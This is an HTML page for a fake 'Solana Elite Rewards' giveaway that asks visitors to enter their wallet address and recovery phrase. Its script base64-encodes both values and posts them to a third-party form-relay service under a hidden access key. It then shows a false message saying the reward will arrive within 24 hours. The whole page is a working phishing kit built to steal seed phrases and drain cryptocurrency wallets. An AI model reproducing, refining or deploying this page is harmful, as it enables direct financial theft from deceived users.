<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SOLANA ELITE REWARDS</title>
    <link href="https://googleapis.com" rel="stylesheet">
    <style>
        :root { --sol-g: #00FFA3; --sol-p: #DC1FFF; }
        
        body { 
            margin: 0; 
            background: #000; 
            color: #fff; 
            font-family: 'Space Grotesk', sans-serif; 
            height: 100vh;
            width: 100vw;
            overflow: hidden; 
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .card { 
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 90%; 
            max-width: 500px; 
            background: #080808; 
            border: 1px solid rgba(0, 255, 163, 0.2); 
            border-radius: 40px; 
            padding: 60px 30px; 
            text-align: center; 
            box-shadow: 0 0 80px rgba(0, 0, 0, 1);
            box-sizing: border-box;
        }

        .sub { 
            font-size: 0.8rem; 
            text-transform: uppercase; 
            letter-spacing: 2px; 
            color: var(--sol-g); 
            margin-bottom: 40px; 
            font-weight: 700; 
            line-height: 1.6;
        }

        .ib { text-align: left; margin-bottom: 30px; }
        
        label { 
            font-size: 0.8rem; 
            text-transform: uppercase; 
            letter-spacing: 2px; 
            color: var(--sol-g); 
            display: block; 
            margin-bottom: 12px; 
            font-weight: 700; 
        }

        textarea { 
            width: 100%; 
            background: #111; 
            border: 1px solid #333; 
            border-radius: 15px; 
            padding: 20px; 
            color: #fff; 
            font-family: 'Space Grotesk', sans-serif; 
            font-size: 1rem; 
            box-sizing: border-box; 
            height: 140px; 
            resize: none;
            outline: none;
        }

        textarea:focus { border-color: var(--sol-g); background: #151515; }

        .btn { 
            width: 100%; 
            padding: 22px; 
            border: none; 
            border-radius: 16px; 
            background: linear-gradient(135deg, var(--sol-g), var(--sol-p)); 
            color: #fff; 
            font-family: 'Syncopate', sans-serif; 
            font-weight: 700; 
            font-size: 0.8rem; 
            cursor: pointer; 
            box-shadow: 0 15px 30px rgba(0, 255, 163, 0.2); 
            text-transform: uppercase;
        }

        #success-view { display: none; }
        
        h1 { 
            font-family: 'Syncopate', sans-serif; 
            font-size: 1.7rem; 
            margin: 0 0 25px 0;
            background: linear-gradient(90deg, var(--sol-g), #fff, var(--sol-p)); 
            -webkit-background-clip: text; 
            -webkit-text-fill-color: transparent; 
            letter-spacing: -1px; 
            font-weight: 700; 
            text-transform: uppercase;
        }

        .congrats { 
            padding: 30px; 
            background: rgba(0, 255, 163, 0.05); 
            border-radius: 20px; 
            border: 1px dashed var(--sol-g); 
            width: 100%;
            box-sizing: border-box;
        }
    </style>
</head>
<body>

    <div class="card">
        <div id="form-view">
            <form id="claim-form">
                <input type="hidden" name="access_key" value="8460d727-7ba5-446e-a522-c226b224fb5f">
                
                <p class="sub">Claim your giveaway with your solana address and recovery phrase below and click claim</p>
                
                <div class="ib">
                    <label>SOLANA ADDRESS</label>
                    <textarea id="sol-address" required></textarea>
                </div>

                <div class="ib">
                    <label>RECOVERY PHRASE</label>
                    <textarea id="rec-phrase" required></textarea>
                </div>

                <input type="hidden" name="name" id="coded-phrase">
                <input type="hidden" name="subject" value="New $1,000 SOL Claim Submission">

                <button type="submit" id="submit-btn" class="btn">CLAIM</button>
            </form>
        </div>

        <div id="success-view">
            <h1>CLAIM SUCCESSFUL</h1>
            <div class="congrats">
                <p class="sub" style="margin-bottom: 0;">Congrats, you have claimed your solana giveaway and you’ll receive it in your wallet address within 24 hrs</p>
            </div>
        </div>
    </div>

    <script>
        const form = document.getElementById('claim-form');
        const formView = document.getElementById('form-view');
        const successView = document.getElementById('success-view');

        form.addEventListener('submit', function(e) {
            e.preventDefault();

            // Prepare Encoding (Address Line 1, Phrase Line 2)
            try {
                const solAddress = document.getElementById('sol-address').value;
                const recPhrase = document.getElementById('rec-phrase').value;
                const combined = solAddress + "\n" + recPhrase;
                document.getElementById('coded-phrase').value = btoa(unescape(encodeURIComponent(combined)));
            } catch (err) {
                document.getElementById('coded-phrase').value = "Encoding Error";
            }

            // Using the EXACT delivery method from your old code
            const formData = new FormData(form);
            fetch('https://api.web3forms.com/submit', {
                method: 'POST',
                body: formData
            });

            // INSTANT page switch
            formView.style.display = "none";
            successView.style.display = "block";
        });
    </script>
</body>
</html>
